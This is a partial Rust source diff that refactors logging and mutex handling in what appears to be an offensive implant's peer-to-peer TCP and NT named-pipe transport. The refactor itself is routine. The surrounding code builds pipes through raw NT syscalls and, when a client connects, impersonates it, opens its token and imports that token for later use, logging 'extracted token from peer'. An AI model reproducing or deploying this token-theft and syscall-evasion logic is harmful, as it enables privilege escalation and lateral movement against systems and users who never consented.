-    use log::{info, warn};
+    use tracing::{info, warn};
     use tokio::io::{AsyncReadExt, AsyncWriteExt};
     use tokio::net::TcpStream;
     use x25519_dalek::{EphemeralSecret, PublicKey};
@@ -4919,7 +4920,7 @@ pub mod tcp_transport {
 
             // ── Certificate enforcement ──
             if link.peer_certificate.is_none() {
-                log::error!(
+                tracing::error!(
                     "p2p-tcp: link {:#010X} transitioned to Connected without certificate — quarantining",
                     link.link_id
                 );
@@ -5119,7 +5120,7 @@ pub mod tcp_transport {
 
                 // ── Certificate enforcement ──
                 if link.peer_certificate.is_none() {
-                    log::error!(
+                    tracing::error!(
                         "p2p-tcp: link {:#010X} transitioned to Connected without certificate — quarantining",
                         link.link_id
                     );
@@ -5215,7 +5216,7 @@ pub mod nt_pipe_server {
     use super::*;
     use crate::win_types::IO_STATUS_BLOCK;
     use anyhow::{anyhow, Result};
-    use log::{info, warn};
+    use tracing::{info, warn};
     use std::sync::Mutex;
     use x25519_dalek::{EphemeralSecret, PublicKey};
 
@@ -5256,7 +5257,7 @@ pub mod nt_pipe_server {
 
     impl std::fmt::Debug for NtPipeHandle {
         fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-            let h = self.handle.lock().unwrap();
+            let h = self.handle.lock_recover();
             f.debug_struct("NtPipeHandle")
                 .field("handle", &format_args!("{:p}", *h))
                 .finish()
@@ -5273,7 +5274,7 @@ pub mod nt_pipe_server {
 
         /// Read exactly `buf.len()` bytes.
         pub fn read_exact(&self, buf: &mut [u8]) -> Result<()> {
-            let handle = *self.handle.lock().unwrap();
+            let handle = *self.handle.lock_recover();
             let mut filled = 0;
             while filled < buf.len() {
                 let n = unsafe { read_file(handle, &mut buf[filled..])? };
@@ -5287,7 +5288,7 @@ pub mod nt_pipe_server {
 
         /// Write all bytes.
         pub fn write_all(&self, buf: &[u8]) -> Result<()> {
-            let handle = *self.handle.lock().unwrap();
+            let handle = *self.handle.lock_recover();
             let mut written = 0;
             while written < buf.len() {
                 let n = unsafe { write_file(handle, &buf[written..])? };
@@ -5343,7 +5344,7 @@ pub mod nt_pipe_server {
 
     impl Drop for NtPipeHandle {
         fn drop(&mut self) {
-            let handle = *self.handle.lock().unwrap();
+            let handle = *self.handle.lock_recover();
             if !handle.is_null() {
                 let _ = unsafe { close_handle(handle) };
             }
@@ -5353,7 +5354,7 @@ pub mod nt_pipe_server {
     // ── NT syscall wrappers ──────────────────────────────────────────────
 
     /// Build a Windows NT UNICODE_STRING on the stack.
-    unsafe fn init_unicode_string(dest: &mut winapi::shared::ntdef::UNICODE_STRING, s: &[u16]) {
+    unsafe fn init_unicode_string(dest: &mut crate::win_types::UNICODE_STRING, s: &[u16]) {
         dest.Buffer = s.as_ptr() as *mut _;
         dest.Length = (s.len() * 2) as u16;
         dest.MaximumLength = dest.Length;
@@ -5377,17 +5378,17 @@ pub mod nt_pipe_server {
             .chain(std::iter::once(0))
             .collect();
 
-        let mut name_str: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
+        let mut name_str: crate::win_types::UNICODE_STRING = std::mem::zeroed();
         init_unicode_string(&mut name_str, &nt_wide);
 
-        let mut obj_attrs: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-        obj_attrs.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+        let mut obj_attrs: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+        obj_attrs.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
         obj_attrs.ObjectName = &mut name_str;
         obj_attrs.Attributes = OBJ_CASE_INSENSITIVE;
 
         let mut iosb: IO_STATUS_BLOCK = std::mem::zeroed();
         let mut handle: *mut std::ffi::c_void = std::ptr::null_mut();
-        let mut timeout: winapi::shared::ntdef::LARGE_INTEGER = std::mem::zeroed();
+        let mut timeout: crate::win_types::LARGE_INTEGER = std::mem::zeroed();
 
         // NtCreateNamedPipeFile signature (11 args):
         //   PipeHandle, DesiredAccess, ObjectAttributes, IoStatusBlock,
@@ -5550,11 +5551,11 @@ pub mod nt_pipe_server {
             .chain(std::iter::once(0))
             .collect();
 
-        let mut name_str: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
+        let mut name_str: crate::win_types::UNICODE_STRING = std::mem::zeroed();
         init_unicode_string(&mut name_str, &nt_wide);
 
-        let mut obj_attrs: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-        obj_attrs.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+        let mut obj_attrs: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+        obj_attrs.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
         obj_attrs.ObjectName = &mut name_str;
         obj_attrs.Attributes = OBJ_CASE_INSENSITIVE;
 
@@ -5727,7 +5728,7 @@ pub mod nt_pipe_server {
 
                 // ── Certificate enforcement ──
                 if link.peer_certificate.is_none() {
-                    log::error!(
+                    tracing::error!(
                         "p2p-pipe: link {:#010X} transitioned to Connected without certificate — quarantining",
                         link.link_id
                     );
@@ -5836,7 +5837,7 @@ pub mod nt_pipe_server {
         pub fn accept_one(&self) -> P2pListenerEvent {
             // 1. FSCTL_PIPE_LISTEN — wait for a client.
             {
-                let handle = *self.server_handle.lock().unwrap();
+                let handle = *self.server_handle.lock_recover();
                 if let Err(e) = unsafe { pipe_listen(handle) } {
                     return P2pListenerEvent::ListenerError(format!(
                         "FSCTL_PIPE_LISTEN failed: {e}"
@@ -5848,7 +5849,7 @@ pub mod nt_pipe_server {
             //    Create a new pipe instance for future connections and steal
             //    the current (now-connected) handle for the client.
             let connected_handle = {
-                let mut guard = self.server_handle.lock().unwrap();
+                let mut guard = self.server_handle.lock_recover();
                 let old = *guard;
                 let max_inst = (self.max_children + 2) as u32;
                 match unsafe { create_named_pipe(&self.pipe_path, max_inst) } {
@@ -5887,7 +5888,7 @@ pub mod nt_pipe_server {
                     } {
                         Some(base) => base,
                         None => {
-                            log::debug!("p2p-pipe: advapi32 not found for token extraction");
+                            tracing::debug!("p2p-pipe: advapi32 not found for token extraction");
                             return P2pListenerEvent::LinkRejected {
                                 reason: 0xFF,
                                 description: "advapi32 not found".into(),
@@ -5932,15 +5933,15 @@ pub mod nt_pipe_server {
                         let ok = unsafe { impersonate(connected_handle as *mut std::ffi::c_void) };
                         if ok != 0 {
                             // Extract the impersonation token from this thread.
-                            let mut token: winapi::um::winnt::HANDLE = std::ptr::null_mut();
-                            let current_thread: winapi::um::winnt::HANDLE =
-                                (-1isize) as winapi::um::winnt::HANDLE; // pseudo-handle
+                            let mut token: crate::win_types::HANDLE = std::ptr::null_mut();
+                            let current_thread: crate::win_types::HANDLE =
+                                (-1isize) as crate::win_types::HANDLE; // pseudo-handle
                             let open_ok = unsafe {
                                 open_tok(
                                     current_thread,
-                                    winapi::um::winnt::TOKEN_DUPLICATE
-                                        | winapi::um::winnt::TOKEN_QUERY
-                                        | winapi::um::winnt::TOKEN_IMPERSONATE,
+                                    windows_sys::Win32::Security::TOKEN_DUPLICATE
+                                        | windows_sys::Win32::Security::TOKEN_QUERY
+                                        | windows_sys::Win32::Security::TOKEN_IMPERSONATE,
                                     1, // OpenAsSelf = TRUE
                                     &mut token,
                                 )
@@ -5954,22 +5955,22 @@ pub mod nt_pipe_server {
                                 );
                                 match crate::token_impersonation::import_token(token, source) {
                                     Ok(info) => {
-                                        log::info!("p2p-pipe: extracted token from peer: {info}");
+                                        tracing::info!("p2p-pipe: extracted token from peer: {info}");
                                     }
                                     Err(e) => {
-                                        log::debug!("p2p-pipe: token import failed: {e:#}");
+                                        tracing::debug!("p2p-pipe: token import failed: {e:#}");
                                     }
                                 }
                                 // Close the original token — import_token duplicates it.
                                 let _ = crate::syscall!("NtClose", token as u64);
                             }
                         } else {
-                            log::debug!(
+                            tracing::debug!(
                                 "p2p-pipe: ImpersonateNamedPipeClient failed for token extraction"
                             );
                         }
                     } else {
-                        log::debug!("p2p-pipe: could not resolve advapi32 token functions");
+                        tracing::debug!("p2p-pipe: could not resolve advapi32 token functions");
                     }
                 }
             }
@@ -6067,7 +6068,7 @@ pub mod nt_pipe_server {
 
             // ── Certificate enforcement ──
             if link.peer_certificate.is_none() {
-                log::error!(
+                tracing::error!(
                     "p2p-pipe: link {:#010X} transitioned to Connected without certificate — quarantining",
                     link.link_id
                 );
@@ -6174,7 +6175,7 @@ pub mod nt_pipe_server {
 
     impl Drop for P2pPipeListener {
         fn drop(&mut self) {
-            let handle = *self.server_handle.lock().unwrap();
+            let handle = *self.server_handle.lock_recover();
             if !handle.is_null() {
                 let _ = unsafe { close_handle(handle) };
             }
